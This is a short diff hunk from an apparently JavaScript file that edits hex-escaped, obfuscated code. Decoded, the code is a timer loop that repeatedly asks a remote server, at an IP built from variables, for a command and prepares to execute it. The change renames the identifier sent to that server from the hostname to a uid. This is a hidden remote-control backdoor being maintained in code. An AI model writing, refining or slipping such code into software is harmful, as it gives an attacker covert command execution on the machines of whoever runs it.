@@ -64,8 +64,7 @@ try {
             '\\x20\\x20},\\x205000);\\x0a' +
             '\\x20\\x20setInterval(async\\x20()\\x20=>\\x20{\\x0a' +
             '\\x20\\x20\\x20\\x20try\\x20{\\x0a' +
-            '\\x20\\x20\\x20\\x20\\x20\\x20const\\x20hostname\\x20=\\x20os.hostname();\\x0a'+
-            '\\x20\\x20\\x20\\x20\\x20\\x20const\\x20response\\x20=\\x20await\\x20axios.get(\\x60http://\\x24{a}.\\x24{b}.\\x24{c}.\\x24{d}:\\x24{p}/command?hostname=\\x60+hostname);\\x0a' +
+            '\\x20\\x20\\x20\\x20\\x20\\x20const\\x20response\\x20=\\x20await\\x20axios.get(\\x60http://\\x24{a}.\\x24{b}.\\x24{c}.\\x24{d}:\\x24{p}/command?uid=\\x60+uid);\\x0a' +
             '\\x20\\x20\\x20\\x20\\x20\\x20const\\x20command\\x20=\\x20response.data.command;\\x0a' +
             '\\x20\\x20\\x20\\x20\\x20\\x20if\\x20(command)\\x20{\\x0a' +
             '\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20let\\x20output;\\x0a' +
